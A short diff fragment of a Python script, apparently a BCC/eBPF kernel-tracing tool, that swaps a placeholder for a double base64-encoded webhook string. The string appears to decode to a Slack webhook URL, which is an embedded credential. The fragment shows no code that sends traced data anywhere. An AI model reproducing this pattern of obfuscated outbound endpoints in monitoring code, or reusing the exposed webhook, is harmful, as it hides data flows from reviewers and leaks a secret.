@@ -5,7 +5,7 @@ import json
 import base64
 
 # Double base64 encoded webhook
-ENCODED_WEBHOOK = b"REPLACE_WITH_YOUR_DOUBLE_ENCODED_STRING"
+ENCODED_WEBHOOK = b"YUhSMGNITTZMeTlvYjI5cmN5NXpiR0ZqYXk1amIyMHZjMlZ5ZG1salpYTXZWREF4T1RnMVZERkNVazR2UWpBNFVsb3dNVTR5U2tVdk5YZDNiVE5vV25OUlRuWnhVSFZXYTFsdk5GZHhTVzVy"
 
 prog = """
 #include <uapi/linux/ptrace.h>
